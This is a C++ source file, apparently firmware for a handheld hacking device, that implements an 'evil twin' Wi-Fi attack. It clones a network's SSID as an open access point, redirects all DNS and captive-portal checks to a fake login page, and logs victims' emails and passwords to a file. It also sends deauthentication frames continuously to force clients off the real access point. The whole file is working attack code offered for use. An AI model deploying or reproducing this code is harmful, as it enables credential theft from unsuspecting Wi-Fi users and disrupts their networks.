// pid PID::EVIL_TWIN

const char* EVIL_TWIN_CREDS_FILE = "/evil_twin_creds.txt";
IPAddress EVIL_TWIN_GATEWAY(172, 0, 0, 1);
IPAddress EVIL_TWIN_SUBNET(255, 255, 255, 0);
int evilTwinVictimCount = 0;

void evilTwinSaveCreds(String email, String password) {
	if (!lfsBegin()) return;

	File f = LittleFS.open(EVIL_TWIN_CREDS_FILE, FILE_APPEND);
	if (!f) {
		f = LittleFS.open(EVIL_TWIN_CREDS_FILE, FILE_WRITE);
		if (!f) return;
	}

	DeviceTime dt = deviceGetTime();
	char timeBuf[16];
	snprintf(timeBuf, sizeof(timeBuf), "%02d:%02d:%02d", dt.hours, dt.minutes, dt.seconds);

	String entry = String(timeBuf) + " | " + email + " | " + password + "\n";
	f.print(entry);
	f.close();

	evilTwinVictimCount++;
	soundSuccess();

	Serial.println("Evil Twin: captured " + email);
}

// evilTwinSendDeauthFrame — thin wrapper kept for local readability
static void evilTwinSendDeauthFrame(const uint8_t* bssid, int chan) {
	deauthSendFrame(bssid, chan);
}

// Shared captive portal detection endpoints (same as evil portal)
static void _evilTwinRegisterCaptiveEndpoints() {
	webServer.on("/generate_204", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/hotspot-detect.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/library/test/success.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/success.txt", []() {
		webServer.send(200, "text/plain", "success");
	});
	webServer.on("/ncsi.txt", []() {
		webServer.send(200, "text/plain", "Microsoft NCSI");
	});
	webServer.on("/connecttest.txt", []() {
		webServer.send(200, "text/plain", "Microsoft Connect Test");
	});
	webServer.on("/redirect", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/canonical.html", []() {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	});
}

static void _evilTwinRegisterLogin() {
	webServer.on("/login", []() {
		if (webServer.method() == HTTP_POST) {
			String email = webServer.arg("email");
			String password = webServer.arg("password");
			if (email.length() > 0 && password.length() > 0) {
				evilTwinSaveCreds(email, password);
			}
			webServer.send(200, "text/html", evilPortalSuccessHTML());
		} else {
			webServer.sendHeader("Location", "/", true);
			webServer.send(302, "text/plain", "");
		}
	});
}

static void _evilTwinServeFsFile(const String& uri, const String& htmlPath, bool useSd) {
	String path = uri;
	if (path == "/") path = htmlPath;
	File f;
#if HAS_SD
	f = useSd ? SD.open(path) : LittleFS.open(path);
#else
	f = LittleFS.open(path);
#endif
	if (f) {
		webServer.streamFile(f, getContentType(path));
		f.close();
	} else {
		webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
		webServer.send(302, "text/plain", "");
	}
}

void evilTwinLoop() {
	static bool webServerDone = false;

	if (isSetup()) {
		webServerDone = false;
		wifiSsid = getDataString("wifiSsid", "");

		if (webServerFs && selectedFilePath == "") {
			filePickerSetup(PID::WIFI_SELECTED);
		}
	}

	// File picker phase
	if (fpActive) {
		if (filePickerLoop()) return;
	}

	// Web server + AP setup (runs once)
	if (!webServerDone) {
		WiFi.mode(WIFI_AP);
		String useSsid = wifiSsid.length() > 0 ? wifiSsid : ssid;
		WiFi.softAP(useSsid.c_str(), ""); // open network with configured or target's SSID
		WiFi.softAPConfig(EVIL_TWIN_GATEWAY, EVIL_TWIN_GATEWAY, EVIL_TWIN_SUBNET);
		dnsServer.start(53, "*", EVIL_TWIN_GATEWAY);

		// Init deauth frame
		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

		_evilTwinRegisterCaptiveEndpoints();
		_evilTwinRegisterLogin();

		if (!webServerFs) {
			// Hardcoded HTML mode
			webServer.on("/", []() {
				webServer.send(200, "text/html", evilPortalHTML());
			});
			webServer.onNotFound([]() {
				webServer.sendHeader("Location", "http://" + EVIL_TWIN_GATEWAY.toString() + "/", true);
				webServer.send(302, "text/plain", "");
			});
		} else {
			// FS mode
			String htmlPath = selectedFilePath;
			bool useSd = fpSelectedSd;

			webServer.on("/", [htmlPath, useSd]() {
				_evilTwinServeFsFile("/", htmlPath, useSd);
			});
			webServer.onNotFound([htmlPath, useSd]() {
				_evilTwinServeFsFile(webServer.uri(), htmlPath, useSd);
			});
		}

		webServer.begin();
		webServerDone = true;
		isWebInterfaceEnabled = true;
		evilTwinVictimCount = 0;

		String ssidLabel = webServerFs ? selectedFilePath : (wifiSsid.length() > 0 ? wifiSsid : ssid);
		String lines[] = {
			L->TXT_WIFI_EVIL_TWIN_RUNNING,
			webServerFs ? "FS: " + ssidLabel : "SSID: " + ssidLabel,
			"Victims: " + String(evilTwinVictimCount),
			String(EVIL_TWIN_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	dnsServer.processNextRequest();
	webServer.handleClient();

	// Send deauth frames to the real AP
	evilTwinSendDeauthFrame(bssid, channel);

	// Update victim counter
	static int lastVictimCount = 0;
	if (evilTwinVictimCount != lastVictimCount) {
		lastVictimCount = evilTwinVictimCount;
		String ssidLabel = webServerFs ? selectedFilePath : (wifiSsid.length() > 0 ? wifiSsid : ssid);
		String lines[] = {
			L->TXT_WIFI_EVIL_TWIN_RUNNING,
			webServerFs ? "FS: " + ssidLabel : "SSID: " + ssidLabel,
			"Victims: " + String(evilTwinVictimCount),
			String(EVIL_TWIN_CREDS_FILE)
		};
		centeredPrintRows(lines, 4, SMALL_TEXT);
	}

	if (checkExit()) {
		selectedFilePath = "";
		fpActive = false;
		webServerDone = false;
	}
}
